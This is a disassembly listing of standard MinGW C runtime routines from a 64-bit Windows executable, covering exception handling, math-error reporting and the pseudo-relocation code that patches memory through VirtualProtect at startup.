   140004025:	31 db                	xor    %ebx,%ebx
   140004027:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000402c:	31 d2                	xor    %edx,%edx
   14000402e:	e8 ad 15 00 00       	call   1400055e0 <signal>
   140004033:	48 85 c0             	test   %rax,%rax
   140004036:	0f 84 a7 00 00 00    	je     1400040e3 <_gnu_exception_handler+0x113>
   14000403c:	48 83 f8 01          	cmp    $0x1,%rax
   140004040:	75 40                	jne    140004082 <_gnu_exception_handler+0xb2>
   140004042:	ba 01 00 00 00       	mov    $0x1,%edx
   140004047:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000404c:	e8 8f 15 00 00       	call   1400055e0 <signal>
   140004051:	84 db                	test   %bl,%bl
   140004053:	0f 85 c7 00 00 00    	jne    140004120 <_gnu_exception_handler+0x150>
   140004059:	e8 32 01 00 00       	call   140004190 <_fpreset>
   14000405e:	e9 bd 00 00 00       	jmp    140004120 <_gnu_exception_handler+0x150>
   140004063:	3d 02 00 00 80       	cmp    $0x80000002,%eax
   140004068:	0f 84 b2 00 00 00    	je     140004120 <_gnu_exception_handler+0x150>
   14000406e:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
   140004073:	74 46                	je     1400040bb <_gnu_exception_handler+0xeb>
   140004075:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
   14000407a:	0f 84 a0 00 00 00    	je     140004120 <_gnu_exception_handler+0x150>
   140004080:	eb 61                	jmp    1400040e3 <_gnu_exception_handler+0x113>
   140004082:	b9 08 00 00 00       	mov    $0x8,%ecx
   140004087:	e9 8e 00 00 00       	jmp    14000411a <_gnu_exception_handler+0x14a>
   14000408c:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
   140004091:	75 50                	jne    1400040e3 <_gnu_exception_handler+0x113>
   140004093:	b9 04 00 00 00       	mov    $0x4,%ecx
   140004098:	31 d2                	xor    %edx,%edx
   14000409a:	e8 41 15 00 00       	call   1400055e0 <signal>
   14000409f:	48 85 c0             	test   %rax,%rax
   1400040a2:	74 3f                	je     1400040e3 <_gnu_exception_handler+0x113>
   1400040a4:	48 83 f8 01          	cmp    $0x1,%rax
   1400040a8:	75 64                	jne    14000410e <_gnu_exception_handler+0x13e>
   1400040aa:	ba 01 00 00 00       	mov    $0x1,%edx
   1400040af:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400040b4:	e8 27 15 00 00       	call   1400055e0 <signal>
   1400040b9:	eb 65                	jmp    140004120 <_gnu_exception_handler+0x150>
   1400040bb:	b9 0b 00 00 00       	mov    $0xb,%ecx
   1400040c0:	31 d2                	xor    %edx,%edx
   1400040c2:	e8 19 15 00 00       	call   1400055e0 <signal>
   1400040c7:	48 85 c0             	test   %rax,%rax
   1400040ca:	74 17                	je     1400040e3 <_gnu_exception_handler+0x113>
   1400040cc:	48 83 f8 01          	cmp    $0x1,%rax
   1400040d0:	75 43                	jne    140004115 <_gnu_exception_handler+0x145>
   1400040d2:	ba 01 00 00 00       	mov    $0x1,%edx
   1400040d7:	b9 0b 00 00 00       	mov    $0xb,%ecx
   1400040dc:	e8 ff 14 00 00       	call   1400055e0 <signal>
   1400040e1:	eb 3d                	jmp    140004120 <_gnu_exception_handler+0x150>
   1400040e3:	48 8b 05 de 64 07 00 	mov    0x764de(%rip),%rax        # 14007a5c8 <__mingw_oldexcpt_handler>
   1400040ea:	48 85 c0             	test   %rax,%rax
   1400040ed:	74 14                	je     140004103 <_gnu_exception_handler+0x133>
   1400040ef:	48 8b 15 7a 32 07 00 	mov    0x7327a(%rip),%rdx        # 140077370 <__guard_dispatch_icall_fptr>
   1400040f6:	48 89 f9             	mov    %rdi,%rcx
   1400040f9:	48 83 c4 20          	add    $0x20,%rsp
   1400040fd:	5b                   	pop    %rbx
   1400040fe:	5f                   	pop    %rdi
   1400040ff:	5e                   	pop    %rsi
   140004100:	48 ff e2             	rex.W jmp *%rdx
   140004103:	31 f6                	xor    %esi,%esi
   140004105:	eb 19                	jmp    140004120 <_gnu_exception_handler+0x150>
   140004107:	b3 01                	mov    $0x1,%bl
   140004109:	e9 19 ff ff ff       	jmp    140004027 <_gnu_exception_handler+0x57>
   14000410e:	b9 04 00 00 00       	mov    $0x4,%ecx
   140004113:	eb 05                	jmp    14000411a <_gnu_exception_handler+0x14a>
   140004115:	b9 0b 00 00 00       	mov    $0xb,%ecx
   14000411a:	ff 15 50 32 07 00    	call   *0x73250(%rip)        # 140077370 <__guard_dispatch_icall_fptr>
   140004120:	89 f0                	mov    %esi,%eax
   140004122:	48 83 c4 20          	add    $0x20,%rsp
   140004126:	5b                   	pop    %rbx
   140004127:	5f                   	pop    %rdi
   140004128:	5e                   	pop    %rsi
   140004129:	c3                   	ret
   14000412a:	cc                   	int3
   14000412b:	cc                   	int3
   14000412c:	cc                   	int3
   14000412d:	cc                   	int3
   14000412e:	cc                   	int3
   14000412f:	cc                   	int3

0000000140004130 <__mingw_raise_matherr>:
   140004130:	48 83 ec 48          	sub    $0x48,%rsp
   140004134:	48 8b 05 95 64 07 00 	mov    0x76495(%rip),%rax        # 14007a5d0 <stUserMathErr>
   14000413b:	48 85 c0             	test   %rax,%rax
   14000413e:	74 2c                	je     14000416c <__mingw_raise_matherr+0x3c>
   140004140:	f2 0f 10 44 24 70    	movsd  0x70(%rsp),%xmm0
   140004146:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   14000414a:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   14000414f:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
   140004155:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
   14000415b:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
   140004161:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004166:	ff 15 04 32 07 00    	call   *0x73204(%rip)        # 140077370 <__guard_dispatch_icall_fptr>
   14000416c:	90                   	nop
   14000416d:	48 83 c4 48          	add    $0x48,%rsp
   140004171:	c3                   	ret
   140004172:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004179:	1f 84 00 00 00 00 00 

0000000140004180 <__mingw_setusermatherr>:
   140004180:	48 89 0d 49 64 07 00 	mov    %rcx,0x76449(%rip)        # 14007a5d0 <stUserMathErr>
   140004187:	e9 64 14 00 00       	jmp    1400055f0 <__setusermatherr>
   14000418c:	cc                   	int3
   14000418d:	cc                   	int3
   14000418e:	cc                   	int3
   14000418f:	cc                   	int3

0000000140004190 <_fpreset>:
   140004190:	db e3                	fninit
   140004192:	c3                   	ret
   140004193:	cc                   	int3
   140004194:	cc                   	int3
   140004195:	cc                   	int3
   140004196:	cc                   	int3
   140004197:	cc                   	int3
   140004198:	cc                   	int3
   140004199:	cc                   	int3
   14000419a:	cc                   	int3
   14000419b:	cc                   	int3
   14000419c:	cc                   	int3
   14000419d:	cc                   	int3
   14000419e:	cc                   	int3
   14000419f:	cc                   	int3

00000001400041a0 <_matherr>:
   1400041a0:	56                   	push   %rsi
   1400041a1:	57                   	push   %rdi
   1400041a2:	48 83 ec 38          	sub    $0x38,%rsp
   1400041a6:	48 89 ce             	mov    %rcx,%rsi
   1400041a9:	8b 01                	mov    (%rcx),%eax
   1400041ab:	ff c8                	dec    %eax
   1400041ad:	83 f8 05             	cmp    $0x5,%eax
   1400041b0:	77 12                	ja     1400041c4 <_matherr+0x24>
   1400041b2:	89 c0                	mov    %eax,%eax
   1400041b4:	48 8d 0d 6d 2e 07 00 	lea    0x72e6d(%rip),%rcx        # 140077028 <.refptr.__CTOR_LIST__+0x148>
   1400041bb:	48 63 3c 81          	movslq (%rcx,%rax,4),%rdi
   1400041bf:	48 01 cf             	add    %rcx,%rdi
   1400041c2:	eb 07                	jmp    1400041cb <_matherr+0x2b>
   1400041c4:	48 8d 3d 22 2e 07 00 	lea    0x72e22(%rip),%rdi        # 140076fed <.refptr.__CTOR_LIST__+0x10d>
   1400041cb:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400041d0:	e8 2b 14 00 00       	call   140005600 <__acrt_iob_func>
   1400041d5:	4c 8b 4e 08          	mov    0x8(%rsi),%r9
   1400041d9:	0f 10 46 10          	movups 0x10(%rsi),%xmm0
   1400041dd:	f2 0f 10 4e 20       	movsd  0x20(%rsi),%xmm1
   1400041e2:	f2 0f 11 4c 24 30    	movsd  %xmm1,0x30(%rsp)
   1400041e8:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   1400041ed:	48 8d 15 07 2e 07 00 	lea    0x72e07(%rip),%rdx        # 140076ffb <.refptr.__CTOR_LIST__+0x11b>
   1400041f4:	48 89 c1             	mov    %rax,%rcx
   1400041f7:	49 89 f8             	mov    %rdi,%r8
   1400041fa:	e8 71 09 00 00       	call   140004b70 <fprintf>
   1400041ff:	31 c0                	xor    %eax,%eax
   140004201:	48 83 c4 38          	add    $0x38,%rsp
   140004205:	5f                   	pop    %rdi
   140004206:	5e                   	pop    %rsi
   140004207:	c3                   	ret
   140004208:	cc                   	int3
   140004209:	cc                   	int3
   14000420a:	cc                   	int3
   14000420b:	cc                   	int3
   14000420c:	cc                   	int3
   14000420d:	cc                   	int3
   14000420e:	cc                   	int3
   14000420f:	cc                   	int3

0000000140004210 <_pei386_runtime_relocator>:
   140004210:	55                   	push   %rbp
   140004211:	41 57                	push   %r15
   140004213:	41 56                	push   %r14
   140004215:	41 55                	push   %r13
   140004217:	41 54                	push   %r12
   140004219:	56                   	push   %rsi
   14000421a:	57                   	push   %rdi
   14000421b:	53                   	push   %rbx
   14000421c:	48 83 ec 18          	sub    $0x18,%rsp
   140004220:	48 8d 6c 24 10       	lea    0x10(%rsp),%rbp
   140004225:	80 3d cc 63 07 00 00 	cmpb   $0x0,0x763cc(%rip)        # 14007a5f8 <_pei386_runtime_relocator.was_init>
   14000422c:	0f 85 6d 01 00 00    	jne    14000439f <_pei386_runtime_relocator+0x18f>
   140004232:	c6 05 bf 63 07 00 01 	movb   $0x1,0x763bf(%rip)        # 14007a5f8 <_pei386_runtime_relocator.was_init>
   140004239:	48 83 ec 20          	sub    $0x20,%rsp
   14000423d:	e8 fe 0a 00 00       	call   140004d40 <__mingw_GetSectionCount>
   140004242:	48 83 c4 20          	add    $0x20,%rsp
   140004246:	48 98                	cltq
   140004248:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   14000424c:	48 8d 04 c5 0f 00 00 	lea    0xf(,%rax,8),%rax
   140004253:	00 
   140004254:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140004258:	e8 77 05 00 00       	call   1400047d4 <___chkstk_ms>
   14000425d:	48 29 c4             	sub    %rax,%rsp
   140004260:	48 89 e0             	mov    %rsp,%rax
   140004263:	48 89 05 96 63 07 00 	mov    %rax,0x76396(%rip)        # 14007a600 <the_secs>
   14000426a:	c7 05 94 63 07 00 00 	movl   $0x0,0x76394(%rip)        # 14007a608 <maxSections>
   140004271:	00 00 00 
   140004274:	48 8b 3d 6d 2f 07 00 	mov    0x72f6d(%rip),%rdi        # 1400771e8 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST_END__>
   14000427b:	48 89 f8             	mov    %rdi,%rax
   14000427e:	48 2b 05 6b 2f 07 00 	sub    0x72f6b(%rip),%rax        # 1400771f0 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST__>
   140004285:	48 83 f8 07          	cmp    $0x7,%rax
   140004289:	0f 8e 10 01 00 00    	jle    14000439f <_pei386_runtime_relocator+0x18f>
   14000428f:	48 8b 1d 5a 2f 07 00 	mov    0x72f5a(%rip),%rbx        # 1400771f0 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST__>
   140004296:	48 89 f8             	mov    %rdi,%rax
   140004299:	48 29 d8             	sub    %rbx,%rax
   14000429c:	48 83 f8 0c          	cmp    $0xc,%rax
   1400042a0:	7c 2c                	jl     1400042ce <_pei386_runtime_relocator+0xbe>
   1400042a2:	48 8b 1d 47 2f 07 00 	mov    0x72f47(%rip),%rbx        # 1400771f0 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST__>
   1400042a9:	83 3b 00             	cmpl   $0x0,(%rbx)
   1400042ac:	75 2f                	jne    1400042dd <_pei386_runtime_relocator+0xcd>
   1400042ae:	48 8b 1d 3b 2f 07 00 	mov    0x72f3b(%rip),%rbx        # 1400771f0 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST__>
   1400042b5:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   1400042b9:	75 22                	jne    1400042dd <_pei386_runtime_relocator+0xcd>
   1400042bb:	48 8b 05 2e 2f 07 00 	mov    0x72f2e(%rip),%rax        # 1400771f0 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST__>
   1400042c2:	48 8d 58 0c          	lea    0xc(%rax),%rbx
   1400042c6:	83 78 08 00          	cmpl   $0x0,0x8(%rax)
   1400042ca:	48 0f 45 d8          	cmovne %rax,%rbx
   1400042ce:	83 3b 00             	cmpl   $0x0,(%rbx)
   1400042d1:	75 0a                	jne    1400042dd <_pei386_runtime_relocator+0xcd>
   1400042d3:	83 7b 04 00          	cmpl   $0x0,0x4(%rbx)
   1400042d7:	0f 84 d3 00 00 00    	je     1400043b0 <_pei386_runtime_relocator+0x1a0>
   1400042dd:	48 3b 1d 04 2f 07 00 	cmp    0x72f04(%rip),%rbx        # 1400771e8 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST_END__>
   1400042e4:	73 48                	jae    14000432e <_pei386_runtime_relocator+0x11e>
   1400042e6:	4c 8b 35 1b 1d 00 00 	mov    0x1d1b(%rip),%r14        # 140006008 <.refptr.__ImageBase>
   1400042ed:	48 8d 75 fc          	lea    -0x4(%rbp),%rsi
   1400042f1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400042f8:	0f 1f 84 00 00 00 00 
   1400042ff:	00 
   140004300:	8b 03                	mov    (%rbx),%eax
   140004302:	8b 4b 04             	mov    0x4(%rbx),%ecx
   140004305:	42 03 04 31          	add    (%rcx,%r14,1),%eax
   140004309:	4c 01 f1             	add    %r14,%rcx
   14000430c:	89 45 fc             	mov    %eax,-0x4(%rbp)
   14000430f:	48 83 ec 20          	sub    $0x20,%rsp
   140004313:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140004319:	48 89 f2             	mov    %rsi,%rdx
   14000431c:	e8 ff 01 00 00       	call   140004520 <__write_memory>
   140004321:	48 83 c4 20          	add    $0x20,%rsp
   140004325:	48 83 c3 08          	add    $0x8,%rbx
   140004329:	48 39 fb             	cmp    %rdi,%rbx
   14000432c:	72 d2                	jb     140004300 <_pei386_runtime_relocator+0xf0>
   14000432e:	8b 05 d4 62 07 00    	mov    0x762d4(%rip),%eax        # 14007a608 <maxSections>
   140004334:	85 c0                	test   %eax,%eax
   140004336:	7e 67                	jle    14000439f <_pei386_runtime_relocator+0x18f>
   140004338:	bf 10 00 00 00       	mov    $0x10,%edi
   14000433d:	48 8b 15 bc 62 07 00 	mov    0x762bc(%rip),%rdx        # 14007a600 <the_secs>
   140004344:	31 db                	xor    %ebx,%ebx
   140004346:	48 89 ee             	mov    %rbp,%rsi
   140004349:	4c 8b 35 18 37 07 00 	mov    0x73718(%rip),%r14        # 140077a68 <__imp_VirtualProtect>
   140004350:	eb 1d                	jmp    14000436f <_pei386_runtime_relocator+0x15f>
   140004352:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004359:	1f 84 00 00 00 00 00 
   140004360:	48 ff c3             	inc    %rbx
   140004363:	48 63 c8             	movslq %eax,%rcx
   140004366:	48 83 c7 28          	add    $0x28,%rdi
   14000436a:	48 39 cb             	cmp    %rcx,%rbx
   14000436d:	7d 30                	jge    14000439f <_pei386_runtime_relocator+0x18f>
   14000436f:	44 8b 44 3a f0       	mov    -0x10(%rdx,%rdi,1),%r8d
   140004374:	45 85 c0             	test   %r8d,%r8d
   140004377:	74 e7                	je     140004360 <_pei386_runtime_relocator+0x150>
   140004379:	48 8b 4c 3a f8       	mov    -0x8(%rdx,%rdi,1),%rcx
   14000437e:	48 8b 14 3a          	mov    (%rdx,%rdi,1),%rdx
   140004382:	48 83 ec 20          	sub    $0x20,%rsp
   140004386:	49 89 f1             	mov    %rsi,%r9
   140004389:	41 ff d6             	call   *%r14
   14000438c:	48 83 c4 20          	add    $0x20,%rsp
   140004390:	48 8b 15 69 62 07 00 	mov    0x76269(%rip),%rdx        # 14007a600 <the_secs>
   140004397:	8b 05 6b 62 07 00    	mov    0x7626b(%rip),%eax        # 14007a608 <maxSections>
   14000439d:	eb c1                	jmp    140004360 <_pei386_runtime_relocator+0x150>
   14000439f:	48 8d 65 08          	lea    0x8(%rbp),%rsp
   1400043a3:	5b                   	pop    %rbx
   1400043a4:	5f                   	pop    %rdi
   1400043a5:	5e                   	pop    %rsi
   1400043a6:	41 5c                	pop    %r12
   1400043a8:	41 5d                	pop    %r13
   1400043aa:	41 5e                	pop    %r14
   1400043ac:	41 5f                	pop    %r15
   1400043ae:	5d                   	pop    %rbp
   1400043af:	c3                   	ret
   1400043b0:	8b 53 08             	mov    0x8(%rbx),%edx
   1400043b3:	83 fa 01             	cmp    $0x1,%edx
   1400043b6:	0f 85 50 01 00 00    	jne    14000450c <_pei386_runtime_relocator+0x2fc>
   1400043bc:	48 83 c3 0c          	add    $0xc,%rbx
   1400043c0:	48 3b 1d 21 2e 07 00 	cmp    0x72e21(%rip),%rbx        # 1400771e8 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST_END__>
   1400043c7:	0f 83 61 ff ff ff    	jae    14000432e <_pei386_runtime_relocator+0x11e>
   1400043cd:	4c 8b 35 34 1c 00 00 	mov    0x1c34(%rip),%r14        # 140006008 <.refptr.__ImageBase>
   1400043d4:	4c 8d 3d 65 2c 07 00 	lea    0x72c65(%rip),%r15        # 140077040 <.refptr.__CTOR_LIST__+0x160>
   1400043db:	4c 8d 25 c6 2d 07 00 	lea    0x72dc6(%rip),%r12        # 1400771a8 <.refptr.__CTOR_LIST__+0x2c8>
   1400043e2:	48 89 ee             	mov    %rbp,%rsi
   1400043e5:	49 bd 00 00 00 00 ff 	movabs $0xffffffff00000000,%r13
   1400043ec:	ff ff ff 
   1400043ef:	eb 1c                	jmp    14000440d <_pei386_runtime_relocator+0x1fd>
   1400043f1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   1400043f8:	0f 1f 84 00 00 00 00 
   1400043ff:	00 
   140004400:	48 83 c3 0c          	add    $0xc,%rbx
   140004404:	48 39 fb             	cmp    %rdi,%rbx
   140004407:	0f 83 21 ff ff ff    	jae    14000432e <_pei386_runtime_relocator+0x11e>
   14000440d:	0f b6 53 08          	movzbl 0x8(%rbx),%edx
   140004411:	8d 42 f8             	lea    -0x8(%rdx),%eax
   140004414:	c1 c0 1d             	rol    $0x1d,%eax
   140004417:	83 f8 07             	cmp    $0x7,%eax
   14000441a:	0f 87 d4 00 00 00    	ja     1400044f4 <_pei386_runtime_relocator+0x2e4>
   140004420:	8b 0b                	mov    (%rbx),%ecx
   140004422:	44 8b 53 04          	mov    0x4(%rbx),%r10d
   140004426:	4d 01 f2             	add    %r14,%r10
   140004429:	4e 8b 0c 31          	mov    (%rcx,%r14,1),%r9
   14000442d:	4d 63 04 87          	movslq (%r15,%rax,4),%r8
   140004431:	4d 01 f8             	add    %r15,%r8
   140004434:	41 ff e0             	jmp    *%r8
   140004437:	45 0f b6 1a          	movzbl (%r10),%r11d
   14000443b:	4d 8d 83 00 ff ff ff 	lea    -0x100(%r11),%r8
   140004442:	45 84 db             	test   %r11b,%r11b
   140004445:	eb 20                	jmp    140004467 <_pei386_runtime_relocator+0x257>
   140004447:	45 8b 1a             	mov    (%r10),%r11d
   14000444a:	4f 8d 04 2b          	lea    (%r11,%r13,1),%r8
   14000444e:	45 85 db             	test   %r11d,%r11d
   140004451:	eb 14                	jmp    140004467 <_pei386_runtime_relocator+0x257>
   140004453:	4d 8b 02             	mov    (%r10),%r8
   140004456:	eb 13                	jmp    14000446b <_pei386_runtime_relocator+0x25b>
   140004458:	45 0f b7 1a          	movzwl (%r10),%r11d
   14000445c:	4d 8d 83 00 00 ff ff 	lea    -0x10000(%r11),%r8
   140004463:	66 45 85 db          	test   %r11w,%r11w
   140004467:	4d 0f 49 c3          	cmovns %r11,%r8
   14000446b:	4c 01 f1             	add    %r14,%rcx
   14000446e:	49 29 c8             	sub    %rcx,%r8
   140004471:	4d 01 c8             	add    %r9,%r8
   140004474:	4c 89 45 00          	mov    %r8,0x0(%rbp)
   140004478:	83 fa 3f             	cmp    $0x3f,%edx
   14000447b:	77 26                	ja     1400044a3 <_pei386_runtime_relocator+0x293>
   14000447d:	49 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%r11
   140004484:	89 d1                	mov    %edx,%ecx
   140004486:	49 d3 e3             	shl    %cl,%r11
   140004489:	49 f7 d3             	not    %r11
   14000448c:	4d 39 d8             	cmp    %r11,%r8
   14000448f:	7f 4b                	jg     1400044dc <_pei386_runtime_relocator+0x2cc>
   140004491:	8d 4a ff             	lea    -0x1(%rdx),%ecx
   140004494:	49 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%r11
   14000449b:	49 d3 e3             	shl    %cl,%r11
   14000449e:	4d 39 d8             	cmp    %r11,%r8
   1400044a1:	7c 39                	jl     1400044dc <_pei386_runtime_relocator+0x2cc>
   1400044a3:	83 f8 08             	cmp    $0x8,%eax
   1400044a6:	0f 92 c2             	setb   %dl
   1400044a9:	41 b0 8b             	mov    $0x8b,%r8b
   1400044ac:	89 c1                	mov    %eax,%ecx
   1400044ae:	41 d2 e8             	shr    %cl,%r8b
   1400044b1:	41 20 d0             	and    %dl,%r8b
   1400044b4:	41 80 f8 01          	cmp    $0x1,%r8b
   1400044b8:	0f 85 42 ff ff ff    	jne    140004400 <_pei386_runtime_relocator+0x1f0>
   1400044be:	89 c0                	mov    %eax,%eax
   1400044c0:	4d 8b 04 c4          	mov    (%r12,%rax,8),%r8
   1400044c4:	48 83 ec 20          	sub    $0x20,%rsp
   1400044c8:	4c 89 d1             	mov    %r10,%rcx
   1400044cb:	48 89 f2             	mov    %rsi,%rdx
   1400044ce:	e8 4d 00 00 00       	call   140004520 <__write_memory>
   1400044d3:	48 83 c4 20          	add    $0x20,%rsp
   1400044d7:	e9 24 ff ff ff       	jmp    140004400 <_pei386_runtime_relocator+0x1f0>
   1400044dc:	48 83 ec 30          	sub    $0x30,%rsp
   1400044e0:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   1400044e5:	48 8d 0d d0 2b 07 00 	lea    0x72bd0(%rip),%rcx        # 1400770bc <.refptr.__CTOR_LIST__+0x1dc>
   1400044ec:	4d 89 d0             	mov    %r10,%r8
   1400044ef:	e8 cc 01 00 00       	call   1400046c0 <__report_error>
   1400044f4:	48 c7 45 00 00 00 00 	movq   $0x0,0x0(%rbp)
   1400044fb:	00 
   1400044fc:	48 83 ec 20          	sub    $0x20,%rsp
   140004500:	48 8d 0d 8b 2b 07 00 	lea    0x72b8b(%rip),%rcx        # 140077092 <.refptr.__CTOR_LIST__+0x1b2>
   140004507:	e8 b4 01 00 00       	call   1400046c0 <__report_error>
   14000450c:	48 83 ec 20          	sub    $0x20,%rsp
   140004510:	48 8d 0d 49 2b 07 00 	lea    0x72b49(%rip),%rcx        # 140077060 <.refptr.__CTOR_LIST__+0x180>
   140004517:	e8 a4 01 00 00       	call   1400046c0 <__report_error>
   14000451c:	cc                   	int3
   14000451d:	0f 1f 00             	nopl   (%rax)

0000000140004520 <__write_memory>:
   140004520:	41 57                	push   %r15
   140004522:	41 56                	push   %r14
   140004524:	41 54                	push   %r12
   140004526:	56                   	push   %rsi
   140004527:	57                   	push   %rdi
   140004528:	53                   	push   %rbx
   140004529:	48 83 ec 58          	sub    $0x58,%rsp
   14000452d:	4c 89 c7             	mov    %r8,%rdi
   140004530:	48 89 d3             	mov    %rdx,%rbx
   140004533:	48 89 ce             	mov    %rcx,%rsi
   140004536:	4c 63 3d cb 60 07 00 	movslq 0x760cb(%rip),%r15        # 14007a608 <maxSections>
   14000453d:	4d 85 ff             	test   %r15,%r15
   140004540:	7e 47                	jle    140004589 <__write_memory+0x69>
   140004542:	48 8b 05 b7 60 07 00 	mov    0x760b7(%rip),%rax        # 14007a600 <the_secs>
   140004549:	4a 8d 0c fd 00 00 00 	lea    0x0(,%r15,8),%rcx
   140004550:	00 
   140004551:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   140004555:	31 d2                	xor    %edx,%edx
   140004557:	eb 10                	jmp    140004569 <__write_memory+0x49>
   140004559:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004560:	48 83 c2 28          	add    $0x28,%rdx
   140004564:	48 39 d1             	cmp    %rdx,%rcx
   140004567:	74 23                	je     14000458c <__write_memory+0x6c>
   140004569:	4c 8b 44 10 18       	mov    0x18(%rax,%rdx,1),%r8
   14000456e:	49 39 f0             	cmp    %rsi,%r8
   140004571:	77 ed                	ja     140004560 <__write_memory+0x40>
   140004573:	4c 8b 4c 10 20       	mov    0x20(%rax,%rdx,1),%r9
   140004578:	45 8b 49 08          	mov    0x8(%r9),%r9d
   14000457c:	4d 01 c8             	add    %r9,%r8
   14000457f:	4c 39 c6             	cmp    %r8,%rsi
   140004582:	73 dc                	jae    140004560 <__write_memory+0x40>
   140004584:	e9 ce 00 00 00       	jmp    140004657 <__write_memory+0x137>
   140004589:	45 31 ff             	xor    %r15d,%r15d
   14000458c:	48 89 f1             	mov    %rsi,%rcx
   14000458f:	e8 3c 07 00 00       	call   140004cd0 <__mingw_GetSectionForAddress>
   140004594:	48 85 c0             	test   %rax,%rax
   140004597:	0f 84 d7 00 00 00    	je     140004674 <__write_memory+0x154>
   14000459d:	49 89 c6             	mov    %rax,%r14
   1400045a0:	48 8b 05 59 60 07 00 	mov    0x76059(%rip),%rax        # 14007a600 <the_secs>
   1400045a7:	4a 8d 0c fd 00 00 00 	lea    0x0(,%r15,8),%rcx
   1400045ae:	00 
   1400045af:	4c 8d 24 89          	lea    (%rcx,%rcx,4),%r12
   1400045b3:	4e 89 74 20 20       	mov    %r14,0x20(%rax,%r12,1)
   1400045b8:	42 c7 04 20 00 00 00 	movl   $0x0,(%rax,%r12,1)
   1400045bf:	00 
   1400045c0:	e8 0b 08 00 00       	call   140004dd0 <_GetPEImageBase>
   1400045c5:	41 8b 4e 0c          	mov    0xc(%r14),%ecx
   1400045c9:	48 01 c1             	add    %rax,%rcx
   1400045cc:	48 8b 05 2d 60 07 00 	mov    0x7602d(%rip),%rax        # 14007a600 <the_secs>
   1400045d3:	4a 89 4c 20 18       	mov    %rcx,0x18(%rax,%r12,1)
   1400045d8:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   1400045dd:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   1400045e3:	ff 15 87 34 07 00    	call   *0x73487(%rip)        # 140077a70 <__imp_VirtualQuery>
   1400045e9:	48 85 c0             	test   %rax,%rax
   1400045ec:	0f 84 91 00 00 00    	je     140004683 <__write_memory+0x163>
   1400045f2:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   1400045f6:	83 f8 07             	cmp    $0x7,%eax
   1400045f9:	7e 13                	jle    14000460e <__write_memory+0xee>
   1400045fb:	83 f8 08             	cmp    $0x8,%eax
   1400045fe:	74 51                	je     140004651 <__write_memory+0x131>
   140004600:	83 f8 40             	cmp    $0x40,%eax
   140004603:	74 4c                	je     140004651 <__write_memory+0x131>
   140004605:	3d 80 00 00 00       	cmp    $0x80,%eax
   14000460a:	74 45                	je     140004651 <__write_memory+0x131>
   14000460c:	eb 10                	jmp    14000461e <__write_memory+0xfe>
   14000460e:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140004614:	83 f8 02             	cmp    $0x2,%eax
   140004617:	74 0b                	je     140004624 <__write_memory+0x104>
   140004619:	83 f8 04             	cmp    $0x4,%eax
   14000461c:	74 33                	je     140004651 <__write_memory+0x131>
   14000461e:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140004624:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140004629:	48 8b 05 d0 5f 07 00 	mov    0x75fd0(%rip),%rax        # 14007a600 <the_secs>
   140004630:	4f 8d 14 bf          	lea    (%r15,%r15,4),%r10
   140004634:	4e 8d 0c d0          	lea    (%rax,%r10,8),%r9
   140004638:	4a 89 4c d0 08       	mov    %rcx,0x8(%rax,%r10,8)
   14000463d:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140004642:	4a 89 54 d0 10       	mov    %rdx,0x10(%rax,%r10,8)
   140004647:	ff 15 1b 34 07 00    	call   *0x7341b(%rip)        # 140077a68 <__imp_VirtualProtect>
   14000464d:	85 c0                	test   %eax,%eax
   14000464f:	74 52                	je     1400046a3 <__write_memory+0x183>
   140004651:	ff 05 b1 5f 07 00    	incl   0x75fb1(%rip)        # 14007a608 <maxSections>
   140004657:	48 89 f1             	mov    %rsi,%rcx
   14000465a:	48 89 da             	mov    %rbx,%rdx
   14000465d:	49 89 f8             	mov    %rdi,%r8
   140004660:	e8 3b 0f 00 00       	call   1400055a0 <memcpy>
   140004665:	90                   	nop
   140004666:	48 83 c4 58          	add    $0x58,%rsp
   14000466a:	5b                   	pop    %rbx
   14000466b:	5f                   	pop    %rdi
   14000466c:	5e                   	pop    %rsi
   14000466d:	41 5c                	pop    %r12
   14000466f:	41 5e                	pop    %r14
   140004671:	41 5f                	pop    %r15
   140004673:	c3                   	ret
